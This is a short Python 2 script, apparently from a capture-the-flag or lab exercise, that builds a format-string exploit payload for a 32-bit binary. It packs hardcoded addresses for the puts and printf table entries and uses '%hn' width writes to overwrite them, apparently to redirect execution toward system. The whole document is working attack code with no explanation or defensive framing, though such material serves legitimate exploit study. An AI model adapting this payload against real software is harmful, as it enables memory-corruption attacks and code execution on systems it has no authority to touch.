import struct
VULN = 0x080485ab
PUTS_PLT = 0x0804a01c
BEFORE_SYS = 0x80485dc
SYS_PLT = 0x804a020
PRINTF_PLT = 0x804a010
RETURN_ADDR = 0xffffcdac
SYSTEM = 0xf7e0fc00

payload = ''
payload += struct.pack("I", PUTS_PLT)
payload += struct.pack("I", PUTS_PLT + 2)
payload += "%7$34211x"
payload += "%7$hn"
payload += "%8$33369x"
payload += "%8$hn"
payload += struct.pack("I", PRINTF_PLT)
payload += struct.pack("I", PRINTF_PLT + 2)
payload += "%16$31828x"
payload += "%16$hn"
payload += "%17$33700x"
payload += "%17$hn"

print payload


